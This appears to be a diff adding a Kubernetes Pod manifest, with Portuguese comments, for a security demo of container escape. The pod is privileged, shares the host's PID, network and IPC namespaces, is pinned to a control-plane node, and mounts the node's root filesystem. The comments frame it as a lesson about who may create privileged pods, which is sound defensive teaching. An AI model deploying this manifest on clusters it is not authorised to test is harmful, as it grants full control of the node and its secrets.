@@ -1,0 +1,39 @@
+# Demo 1a - Container escape via pod privilegiado.
+# Todos os campos abaixo aparecem em charts legitimos (agentes de
+# monitoramento, CNI, CSI, backup). A questao de seguranca nao e a
+# existencia de pods privilegiados, e sim quem tem permissao de cria-los.
+# O pod solicita execucao no control-plane; em clusters gerenciados
+# (EKS/AKS/GKE) esse acesso nao existe, mas em kubeadm/kind, sim.
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pod-privilegiado
+  # Sem namespace fixo: o -n do kubectl decide (reutilizado em ataque/producao/dev).
+spec:
+  # Tolera o taint do control-plane e solicita execucao nesse no.
+  tolerations:
+    - key: node-role.kubernetes.io/control-plane
+      operator: Exists
+      effect: NoSchedule
+  nodeSelector:
+    node-role.kubernetes.io/control-plane: ""
+
+  hostPID: true      # acesso aos processos do no
+  hostNetwork: true  # acesso a rede do no (kubelet, etcd, IMDS da nuvem)
+  hostIPC: true
+
+  containers:
+    - name: shell
+      image: alpine:3.20
+      command: ["sleep", "infinity"]
+      securityContext:
+        privileged: true
+        allowPrivilegeEscalation: true
+      volumeMounts:
+        - name: raiz-do-no
+          mountPath: /host        # disco do no montado no contêiner
+  volumes:
+    - name: raiz-do-no
+      hostPath:
+        path: /
+        type: Directory
